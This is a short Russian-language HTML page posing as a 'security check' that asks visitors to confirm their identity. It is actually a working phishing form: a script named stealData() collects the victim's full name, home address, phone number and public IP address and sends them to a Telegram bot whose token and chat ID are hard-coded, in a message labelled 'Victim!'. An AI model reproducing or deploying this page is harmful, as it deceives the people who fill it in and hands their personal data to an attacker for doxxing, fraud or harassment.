<!DOCTYPE html>
<html>
<head>
    <title>Проверка безопасности</title>
</head>
<body>
    <h2>Для продолжения подтвердите личность</h2>
    <form>
        <input type="text" placeholder="Ваше ФИО" required><br><br>
        <input type="text" placeholder="Ваш домашний адрес" required><br><br>
        <input type="tel" placeholder="Ваш номер телефона" required><br><br>
        <button type="button" onclick="stealData()">ПОДТВЕРДИТЬ</button>
    </form>

    <script>
        function stealData() {
            let fio = document.getElementsByTagName('input')[0].value;
            let address = document.getElementsByTagName('input')[1].value;
            let phone = document.getElementsByTagName('input')[2].value;

            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    let ip = data.ip;
                    let token = "8404371744:AAEu6mQaYSTvuAhF9xTx2C79dizGGozQrz8";
                    let chatId = "6326124450";
                    let message = `Жертва!%0AФИО: ${fio}%0AАдрес: ${address}%0AТелефон: ${phone}%0AIP: ${ip}`;
                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`);
                    alert('Данные отправлены! Спасибо.');
                });
        }
    </script>
</body>
</html>
